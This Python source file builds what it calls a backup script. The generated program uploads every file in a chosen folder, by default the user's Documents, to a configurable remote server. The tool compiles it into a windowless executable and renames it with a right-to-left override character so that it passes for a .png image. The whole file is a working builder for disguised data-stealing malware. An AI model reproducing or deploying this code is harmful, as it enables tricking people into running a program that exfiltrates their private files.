import os
import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess
import time

# RLO-Zeichen
RLO = "\u202E"

# Originaldatei
original = "dist/gnp.exe"

# "getarnter" Name
disguised = RLO + "gnp.exe"

# Template für das Backup-Skript
TEMPLATE = r'''#!/usr/bin/env python3
import os
import hashlib
import requests
from pathlib import Path
from tqdm import tqdm
import time

# -------------- KONFIG --------------
API_TOKEN = "{api_token}"
SERVER_URL = "{server_url}"
BACKUP_DIR = os.path.expandvars(os.path.expanduser(r"{backup_dir}"))

# Chunk-Einstellungen
CHUNK_THRESHOLD = 50 * 1024 * 1024   # Dateien >= 50MB chunken
CHUNK_SIZE = 8 * 1024 * 1024         # 8 MiB pro Chunk

# Retry-Einstellungen
MAX_RETRIES = 3
RETRY_BACKOFF = 2.0  # Sekunden, multipliziert mit attempt

# ------------------------------------

def compute_sha256(path: Path, chunk_size=8*1024*1024):
    h = hashlib.sha256()
    with path.open("rb") as f:
        while True:
            b = f.read(chunk_size)
            if not b:
                break
            h.update(b)
    return h.hexdigest()

def post_with_retries(session, url, files=None, data=None, verify=True, timeout=300):
    attempt = 0
    while attempt < MAX_RETRIES:
        try:
            r = session.post(url, files=files, data=data, verify=verify, timeout=timeout)
            r.raise_for_status()
            return r
        except Exception as e:
            attempt += 1
            if attempt >= MAX_RETRIES:
                raise
            wait = RETRY_BACKOFF * attempt
            print(f"[WARN] Fehler beim Upload (attempt {{attempt}}/{{MAX_RETRIES}}): {{e}}. Warte {{wait:.1f}}s und versuche erneut...")
            time.sleep(wait)

def upload_single(session, local_path: Path, relpath: str):
    data = {{
        "token": API_TOKEN,
        "relpath": relpath,
        "mtime": str(int(local_path.stat().st_mtime))
    }}
    with local_path.open("rb") as fh:
        files = {{"file": (local_path.name, fh)}}
        r = post_with_retries(session, SERVER_URL, files=files, data=data)
    try:
        return r.json()
    except Exception:
        return {{"ok": True, "status_code": r.status_code, "text": r.text}}

def upload_chunked(session, local_path: Path, relpath: str, chunk_size=CHUNK_SIZE):
    total = local_path.stat().st_size
    file_id = compute_sha256(local_path)
    total_chunks = (total + chunk_size - 1) // chunk_size
    print(f"Chunk-Upload: {{relpath}} ({{total}} bytes) in {{total_chunks}} chunks.")
    with local_path.open("rb") as fh:
        with tqdm(total=total, unit="B", unit_scale=True, desc=f"Uploading {{relpath}}", leave=False) as pbar:
            for idx in range(total_chunks):
                chunk = fh.read(chunk_size)
                files = {{"file": (f"{{local_path.name}}.part{{idx}}", chunk)}}
                data = {{
                    "token": API_TOKEN,
                    "relpath": relpath,
                    "chunk_index": str(idx),
                    "total_chunks": str(total_chunks),
                    "file_id": file_id,
                    "mtime": str(int(local_path.stat().st_mtime)),
                }}
                r = post_with_retries(session, SERVER_URL, files=files, data=data)
                try:
                    j = r.json()
                except Exception:
                    j = {{"ok": True}}
                if not j.get("ok", True):
                    raise RuntimeError(f"Server-Fehler beim Chunk {{idx}}: {{j}}")
                pbar.update(len(chunk))
    return {{"ok": True, "assembled": True, "path": relpath}}

def walk_and_upload():
    session = requests.Session()
    base = Path(BACKUP_DIR).expanduser()
    if not base.exists() or not base.is_dir():
        print("Backup-Ordner nicht gefunden:", base)
        return

    stats = {{"uploaded": 0, "errors": 0}}
    for root, dirs, files in os.walk(base):
        root_p = Path(root)
        for fname in files:
            local = root_p / fname
            rel = str(local.relative_to(base)).replace("\\\\", "/")
            try:
                size = local.stat().st_size
                if size >= CHUNK_THRESHOLD:
                    res = upload_chunked(session, local, rel, chunk_size=CHUNK_SIZE)
                else:
                    print(f"Upload: {{rel}} ({{size}} bytes)")
                    res = upload_single(session, local, rel)
                if res.get("ok", True):
                    stats["uploaded"] += 1
                    print(f"[OK] {{rel}}")
                else:
                    stats["errors"] += 1
                    print(f"[ERR] {{rel}} -> {{res}}")
            except Exception as e:
                stats["errors"] += 1
                print(f"[EXC] Fehler bei {{rel}}: {{e}}")
    print("Fertig. Statistik:", stats)

if __name__ == "__main__":
    print("Starte Backup aus:", BACKUP_DIR)
    walk_and_upload()
    print("Backup fertig!")
'''

def generate_script(api_token, server_url, backup_dir):
    script_code = TEMPLATE.format(api_token=api_token, server_url=server_url, backup_dir=backup_dir)
    out_file = "collect-all-data.py"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write(script_code)
    messagebox.showinfo("Fertig", f"Backup-Skript '{out_file}' wurde erstellt!")

def browse_folder(entry):
    folder = filedialog.askdirectory()
    if folder:
        entry.delete(0, tk.END)
        entry.insert(0, folder)

def make_script_and_convert():
    generate_script(entry_token.get(), entry_url.get(), entry_dir.get())
    # PyInstaller ausführen und warten
    subprocess.run([
        "pyinstaller",
        "--onefile",
        "--windowed",
        "--name", "gnp",
        "--icon=icon.ico",
        "collect-all-data.py"
    ], check=True)
    time.sleep(2)  # kurz warten, damit Datei fertig geschrieben wird
    os.rename(original, disguised)

# --- Tkinter GUI ---
root = tk.Tk()
root.title("Backup-Skript Generator")

tk.Label(root, text="API-Token:").grid(row=0, column=0, sticky="e", padx=5, pady=5)
entry_token = tk.Entry(root, width=50)
entry_token.grid(row=0, column=1, padx=5, pady=5)

tk.Label(root, text="Server-URL:").grid(row=1, column=0, sticky="e", padx=5, pady=5)
entry_url = tk.Entry(root, width=50)
entry_url.grid(row=1, column=1, padx=5, pady=5)

tk.Label(root, text="Copying-Verzeichnis (z. B. %USERPROFILE%/Documents):").grid(row=2, column=0, sticky="e", padx=5, pady=5)
entry_dir = tk.Entry(root, width=50)
entry_dir.grid(row=2, column=1, padx=5, pady=5)
btn_browse = tk.Button(root, text="Durchsuchen...", command=lambda: browse_folder(entry_dir))
btn_browse.grid(row=2, column=2, padx=5, pady=5)

btn_generate = tk.Button(root, text="Skript erstellen", 
                         command=lambda: make_script_and_convert())
btn_generate.grid(row=3, column=0, columnspan=3, pady=10)

root.mainloop()
